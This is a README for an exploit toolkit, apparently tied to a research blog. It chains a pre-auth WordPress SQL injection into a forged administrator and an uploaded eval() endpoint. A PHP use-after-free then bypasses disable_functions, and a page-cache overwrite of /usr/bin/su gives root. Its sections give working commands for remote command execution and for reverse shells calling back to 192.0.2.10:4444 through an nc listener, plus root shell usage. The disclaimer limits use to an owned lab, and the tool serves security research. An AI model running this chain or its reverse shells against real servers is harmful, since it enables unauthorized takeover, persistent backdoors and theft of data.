# wp2root

Post-exploitation chain that turns the PHP execution from
[wp2shell](https://slcyber.io/research-center/exploit-brokers-pay-500000-for-a-wordpress-rce-i-found-one-with-gpt5-6/)
into native code and then Linux root, even when `disable_functions` is set, the
filesystem is read-only, and nothing can be written to disk. This is the code
behind [blog.md](./blog.md).

For authorized testing only. Everything here is meant to run against the bundled
local lab or a target you own. The chain makes persistent changes (it creates an
administrator and uploads a plugin) and corrupts process memory, so it can crash
PHP workers.

## Layout

| Path | What it is |
|---|---|
| `wp2shell.py` | The full driver: WordPress foothold plus every post-exploitation mode. |
| `local_exploit.php` | Serializable-UAF payload for the `disable_functions` bypass (mode 1). |
| `rop_serializable.php` | UAF-to-ROP driver that runs a raw PIC blob (mode 2 transport). |
| `root_payload_launcher.asm` | Position-independent launcher: memfd + `execveat` of the helper. |
| `root_payload_helper.c` | Helper that performs Copy Fail (page-cache overwrite of `/usr/bin/su`). |
| `Makefile` | Builds the root artifacts into `build/`. |
| `docker/`, `docker-compose.yml`, `Dockerfile` | Local Apache/mod_php WordPress lab. See [docker/README.md](./docker/README.md). |
| `writeups/` | Full technical write-ups of each stage. |

## Lab setup

The lab is WordPress 7.0.1 on PHP 8.1.34 under Apache, with the restricted
profile the post-exploitation modes target:

```text
disable_functions = system,passthru,exec,shell_exec,proc_open,popen,pcntl_exec
```

Start it:

```console
./docker/setup.sh
```

The site comes up at `http://localhost:8083/` (dashboard `admin / SuperSecret123!`).
Tear it down, volumes and all, with:

```console
docker compose -f docker-compose.yml down -v
```

## Foothold

Run the WordPress chain once. It desynchronizes the REST batch handler into a
pre-auth SQL injection, forges `WP_Post` objects to manufacture an
administrator, and uploads a minimal `eval()` endpoint:

```console
python3 wp2shell.py http://localhost:8083
```

On success it prints the endpoint used by every mode below:

```text
http://localhost:8083/wp-content/plugins/wp2shell/wp2shell.php
```

Reuse it without re-exploiting by passing `--attach-url <that endpoint>`. The
examples below do exactly that.

## Mode 1: bypass `disable_functions`

The web user cannot call `system()` here, so a commodity web shell is dead. This
mode triggers the Serializable UAF, rebuilds the native `zif_system` handler
into a callable fake Closure, and runs commands as the web user (`www-data`)
without ever calling a disabled function or touching disk.

Run one command:

```console
python3 wp2shell.py \
    --attach-url http://localhost:8083/wp-content/plugins/wp2shell/wp2shell.php \
    --uaf-exec 'id; uname -a'
```

Interactive callbacks (start a listener first, e.g. `nc -lvnp 4444`):

```console
# PHP-native callback, no /bin/bash needed on the target
python3 wp2shell.py --wait 240 \
    --attach-url http://localhost:8083/wp-content/plugins/wp2shell/wp2shell.php \
    --uaf-connect 192.0.2.10:4444

# detached /bin/bash reverse shell
python3 wp2shell.py \
    --attach-url http://localhost:8083/wp-content/plugins/wp2shell/wp2shell.php \
    --uaf-bash-connect 192.0.2.10:4444
```

You stay `www-data`. This is the reverse-shell fallback when full root is out of
reach.

## Mode 2: escalate to root with Copy Fail

Build the root artifacts once (needs `gcc` and `nasm`):

```console
make
```

This produces `build/root_payload_helper` and `build/root_payload_launcher.bin`.
The UAF now takes the second branch: instead of calling `system`, it builds a
self-resolving ROP chain, pivots to native code, and runs a position-independent
launcher. The launcher `execveat`s an in-memory helper that overwrites the
page-cache image of setuid-root `/usr/bin/su`, giving root without writing a file
to disk.

Run one command as root:

```console
python3 wp2shell.py \
    --attach-url http://localhost:8083/wp-content/plugins/wp2shell/wp2shell.php \
    --priv-exec 'id'
```

```text
[+] Root command output:
    uid=0(root) gid=0(root) groups=0(root)
```

Get an interactive root shell over the authenticated loopback transport:

```console
python3 wp2shell.py \
    --attach-url http://localhost:8083/wp-content/plugins/wp2shell/wp2shell.php \
    --priv-shell
```

To drive an arbitrary PIC blob through the same ROP transport without the root
helper, use `--pic-file ./payload.bin`.

## Notes

- The root modes assume the documented PHP 8.1 NTS x86-64 layout and a matching
  Linux target. A different build can fail or crash the worker; this is
  memory-corruption post-exploitation, not a stable API.
- Copy Fail is swappable. Any other local privilege-escalation primitive can
  replace the helper with little change to the launcher plumbing.
- Override the default artifacts with `--helper-elf` and `--launcher-pic` when
  testing a separately built helper or launcher.
